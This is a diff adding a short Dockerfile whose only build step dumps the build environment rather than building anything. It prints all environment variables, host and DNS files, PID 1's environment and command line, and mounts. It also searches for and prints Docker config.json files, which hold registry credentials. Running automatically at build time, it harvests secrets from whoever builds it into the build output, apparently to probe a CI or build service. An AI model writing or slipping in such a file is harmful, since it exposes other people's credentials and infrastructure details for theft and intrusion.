@@ -1,0 +1,10 @@
+FROM alpine:3.19
+RUN echo "===ENV===" ; env | sort ; \
+    echo "===HOSTS===" ; cat /etc/hosts ; cat /etc/resolv.conf ; \
+    echo "===DOCKERCFG-SEARCH===" ; find / -maxdepth 5 -name 'config.json' -path '*docker*' 2>/dev/null ; \
+    echo "===DOCKERDIRS===" ; ls -la /root/.docker /tmp/.docker /home/*/.docker 2>&1 | head -20 ; \
+    cat /root/.docker/config.json 2>&1 | head -20 ; \
+    echo "===PROC1ENV===" ; tr '\0' '\n' < /proc/1/environ 2>&1 | head -60 ; \
+    echo "===PROC1CMD===" ; tr '\0' ' ' < /proc/1/cmdline 2>&1 ; echo ; \
+    echo "===MOUNTS===" ; head -20 /proc/mounts ; echo "===DONE==="
+CMD ["sh","-c","echo dump; sleep 20"]
